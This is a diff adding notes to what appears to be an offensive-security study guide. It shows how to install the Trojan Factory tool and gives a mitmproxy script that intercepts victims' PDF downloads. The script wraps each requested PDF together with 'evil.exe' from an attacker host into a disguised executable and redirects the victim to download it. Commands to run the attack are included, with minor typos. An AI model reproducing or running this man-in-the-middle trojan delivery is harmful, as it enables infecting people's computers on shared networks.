@@ -298,6 +298,33 @@ def request(flow):
         print("[+] Got an interesting flow.")
         flow.response = http.HTTPResponse.make(301,  "", {"Location": "http://10.20.215.8/file.exe"})
 ```
+Trojan Factory
+- https://github.com/z00z/TrojanFactory
+Installation:
+    - Download AutoIt (https://www.autoitscript.com/site/autoit/downloads/).
+    - Install it using wine > wine autoit-v3-setup.exe
+    - Clone Trojan Factory: > git clone https://github.com/z00z/TrojanFactory.git
+    - You're all set, navigare into TrojanFactory > cd TrojanFactory
+    - Run --help for usage > python trojan_factory.py --help
+
+```
+import mitmproxy
+import subprocess
+
+def request(flow):
+	#code to handle request flows
+	
+	if flow.request.host != "10.20.215.8" and flow.request.pretty_url.endswith(".pdf"):
+		print("[+] Got interesting flow")
+		
+		front_file = flow.request.pretty_url + "#"
+		subprocess.call("python /opt/TrojanFactory/tronjan_factory.py -f '" + front_file + "' -e http://10.20.215.8/evil.exe# -o /var/www/html/file.exe -i /root/Downloads/pdf.ico", shell=True)
+		
+		flow.response = mitmproxy.http.HTTPResponse.make(301, "", {"Location":"http://10.20.215.8/file.exe"})
+```
+```
+python trojan_factory.py -f (Front file url) -e (evil file url) -o (export path) -i (icon)
+```
 run it
 ```
 mirmdump -s script.py
